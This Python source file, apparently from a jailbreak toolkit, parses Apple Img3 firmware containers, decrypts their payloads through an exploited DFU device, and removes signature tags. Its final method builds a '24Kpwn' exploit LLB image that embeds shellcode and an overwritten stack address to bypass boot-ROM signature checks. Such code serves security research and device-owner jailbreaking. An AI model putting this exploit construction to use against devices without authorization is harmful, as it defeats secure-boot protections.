import binascii, struct
import dfuexec, utilities

class Image3:
    def __init__(self, data):
        (self.magic, self.totalSize, self.dataSize, self.signedSize, self.type) = struct.unpack('4s3I4s', data[0:20])
        self.tags = []
        pos = 20
        while pos < 20 + self.dataSize:
            (tagMagic, tagTotalSize, tagDataSize) = struct.unpack('4s2I', data[pos:pos+12])
            self.tags.append((tagMagic, tagTotalSize, tagDataSize, data[pos+12:pos+tagTotalSize]))
            pos += tagTotalSize
            if tagTotalSize == 0:
                break

    @staticmethod
    def createImage3FromTags(type, tags):
        dataSize = 0
        signedSize = 0
        for (tagMagic, tagTotalSize, tagDataSize, tagData) in tags:
            dataSize += 12 + len(tagData)
            if tagMagic[::-1] not in ['CERT', 'SHSH']:
                signedSize += 12 + len(tagData)

        # totalSize must be rounded up to 64-byte boundary
        totalSize = 20 + dataSize
        remainder = totalSize % 64
        if remainder != 0:
            totalSize += 64 - remainder

        bytes = struct.pack('4s3I4s', 'Img3'[::-1], totalSize, dataSize, signedSize, type)
        for (tagMagic, tagTotalSize, tagDataSize, tagData) in tags:
            bytes += struct.pack('4s2I', tagMagic, tagTotalSize, tagDataSize) + tagData
        return bytes + '\x00' * (totalSize - len(bytes))

    def getTags(self, magic):
        matches = []
        for tag in self.tags:
            if tag[0] == magic:
                matches.append(tag)
        return matches

    def getKeybag(self):
        keybags = self.getTags('KBAG'[::-1])
        for (tagMagic, tagTotalSize, tagDataSize, tagData) in keybags:
            (kbag_type, aes_type) = struct.unpack('<2I', tagData[:8])
            if kbag_type == 1:
                return tagData[8:8+48]
        return None

    def getPayload(self):
        data = self.getTags('DATA'[::-1])
        if len(data) == 1:
            return data[0][3]

    def getDecryptedPayload(self):
        keybag = self.getKeybag()
        device = dfuexec.PwnedDFUDevice()
        decrypted_keybag = device.decrypt_keybag(keybag)
        return utilities.aes_decrypt(self.getPayload(), binascii.hexlify(decrypted_keybag[:16]), binascii.hexlify(decrypted_keybag[16:]))

    def newDecryptedImage3(self):
        typeTag = self.getTags('TYPE'[::-1])
        assert len(typeTag) == 1
        versTag = self.getTags('VERS'[::-1])
        assert len(versTag) <= 1
        dataTags = self.getTags('DATA'[::-1])
        assert len(dataTags) == 1
        sepoTag = self.getTags('SEPO'[::-1])
        assert len(sepoTag) <= 2
        bordTag = self.getTags('BORD'[::-1])
        assert len(bordTag) <= 2
        shshTag = self.getTags('SHSH'[::-1])
        assert len(shshTag) <= 1
        certTag = self.getTags('CERT'[::-1])
        assert len(certTag) <= 1

        (tagMagic, tagTotalSize, tagDataSize, tagData) = dataTags[0]

        if self.getKeybag() == None:
            # no KBAG, must not be encrypted
            decrypted = tagData
        else:
            decrypted = self.getDecryptedPayload()
        assert len(tagData) == len(decrypted)

        # Fix first 20 bytes of 24kpwn LLB
        if self.type == 'illb'[::-1] and self.totalSize >= 0x24000:
            # TODO: Check that DATA tag was in the correct location before decryption.
            DWORD1 = 0xea00000e
            DWORD2 = 0xe59ff018
            decrypted = struct.pack('<5I', DWORD1, DWORD2, DWORD2, DWORD2, DWORD2) + decrypted[20:]
            # Remove SHSH and CERT
            shshTag = []
            certTag = []
        return Image3.createImage3FromTags(self.type, typeTag + [(tagMagic, tagTotalSize, tagDataSize, decrypted)] + versTag + bordTag + shshTag + certTag)

    def newDecrypted24KpwnLLB(self, securerom):
        img3 = self.newDecryptedImage3()

        (old_signed_size,) = struct.unpack('<I', img3[12:16])
        TOTAL_SIZE = 0x24200
        DATA_SIZE = 0x241BC
        SIGNED_SIZE = 0x23FD4
        img3 = img3[:4] + struct.pack('<3I', TOTAL_SIZE, DATA_SIZE, SIGNED_SIZE) + img3[16:20 + old_signed_size]
        img3 += struct.pack('4s2I', '24KP'[::-1], 0x24000 - 24 - old_signed_size - 20, 0)

        f = open('bin/24Kpwn-shellcode.bin', 'rb')
        shellcode = f.read()
        f.close()
        MAX_SHELLCODE_LENGTH = 1024
        assert len(shellcode) <= MAX_SHELLCODE_LENGTH

        SHELLCODE_ADDRESS = 0x84024000 + 1 - 24 - 4 - len(shellcode)
        payload = shellcode + struct.pack('<I4s2I4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)

        STACK_ADDRESS = 0x84033E98
        PADDING_BEFORE = 0x24000 - len(payload) - len(img3)
        PADDING_AFTER = 0x30
        return img3 + '\x00' * PADDING_BEFORE + payload + securerom[0xb000:0xb1cc] + struct.pack('<I', STACK_ADDRESS) + '\x00' * PADDING_AFTER
